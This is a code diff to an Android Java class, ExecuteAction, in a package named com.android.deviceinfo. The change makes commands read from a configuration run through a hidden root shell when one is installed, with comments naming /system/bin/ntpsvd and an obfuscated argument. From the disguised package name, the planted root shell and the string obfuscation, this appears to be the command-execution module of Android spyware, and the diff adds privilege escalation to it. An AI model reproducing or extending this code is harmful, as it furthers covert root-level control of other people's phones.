@@ -9,8 +9,10 @@
 
 package com.android.deviceinfo.action;
 
+import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Trigger;
 import com.android.deviceinfo.auto.Cfg;
+import com.android.deviceinfo.capabilities.PackageInfo;
 import com.android.deviceinfo.conf.ConfAction;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.conf.ConfigurationException;
@@ -46,7 +48,7 @@ public class ExecuteAction extends SubActionSlow {
 	@Override
 	protected boolean parse(final ConfAction params) {
 		try {
-			this.command = Directory.expandMacro(params.getString("command"));			
+			this.command = Directory.expandMacro(params.getString("command"));	
 	
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse): " + this.command);
@@ -73,13 +75,21 @@ public class ExecuteAction extends SubActionSlow {
 	 */
 	@Override
 	public boolean execute(Trigger trigger) {
+		ExecuteResult ret;
+		
 		if (this.command.length() == 0)
 			return false;
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (execute): " + command);
 		}
-		ExecuteResult ret = Execute.execute(this.command);
+		
+		if (Root.isRootShellInstalled()) {
+			ret = Execute.executeRoot(this.command);
+		} else {
+			ret = Execute.execute(this.command);
+		}
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (execute) exitCode: " + ret.exitCode);
 			Check.log(TAG + " (execute) stdout: " + ret.getStdout());
@@ -96,7 +106,7 @@ public class ExecuteAction extends SubActionSlow {
 			//a_0=/system/bin/ntpsvd
 			// 35_0=qzx
 			String cmd = String.format("%s %s %s", Configuration.shellFile, M.e("qzx"), command ); // EXPORT
-			ExecuteResult ret = Execute.execute(cmd);
+			ExecuteResult ret = Execute.execute(Directory.expandMacro(cmd));
 			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (executeRoot) exitCode: " + ret.exitCode);
